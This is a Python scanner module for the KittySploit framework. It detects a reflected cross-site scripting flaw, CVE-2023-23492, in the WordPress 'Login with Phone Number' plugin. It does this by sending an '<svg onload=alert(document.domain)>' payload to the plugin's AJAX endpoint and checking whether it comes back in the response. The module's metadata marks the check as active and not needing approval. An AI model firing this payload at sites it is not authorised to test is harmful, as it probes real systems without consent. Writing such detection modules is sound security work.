#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Login with Phone Number, versions < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Login with Phone Number - Cross-Site Scripting Detection',
        'description': "Login with Phone Number, versions < 1.4.2, is affected by an reflected XSS vulnerability in the login-with-phonenumber.php' file in the 'lwp_forgot_password()' function.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'login-with-phonenumber', 'wordpress', 'wp', 'wp-plugin', 'xss', 'tenable', 'idehweb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wordpress.org/plugins/login-with-phone-number/',
            'https://www.tenable.com/security/research/tra-2023-3',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-23492',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2023-23492',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=lwp_forgot_password&ID=<svg%20onload=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<svg onload=alert(document.domain)>', 'message":"Update password',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Login with Phone Number - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=lwp_forgot_password&ID=<svg%20onload=alert(document.domain)>',
            )
            return True
        return False

